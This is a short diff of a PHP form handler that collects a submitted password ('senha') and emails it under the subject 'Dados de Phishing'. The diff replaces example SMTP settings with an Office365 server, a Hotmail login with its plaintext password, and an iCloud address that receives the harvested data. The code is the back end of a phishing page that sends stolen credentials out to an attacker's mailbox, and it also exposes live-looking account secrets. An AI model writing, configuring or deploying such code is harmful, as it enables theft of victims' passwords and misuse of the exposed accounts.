@@ -5,13 +5,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $senha = $_POST['senha'];
 
     // Configurações do servidor SMTP
-    $host = 'smtp.exemplo.com';
+    $host = 'smtp.office365.com';
     $port = 587;
-    $username = 'seu_email@exemplo.com';
-    $password = 'sua_senha';
+    $username = 'lomb4da@hotmail.com';
+    $password = 'N5987@#$ok';
     
     // Endereço de e-mail para onde os dados serão enviados
-    $destinatario = 'email_destinatario@exemplo.com';
+    $destinatario = 'lombo05.abracador@icloud.com';
     
     // Constrói o corpo do e-mail
     $assunto = 'Dados de Phishing';
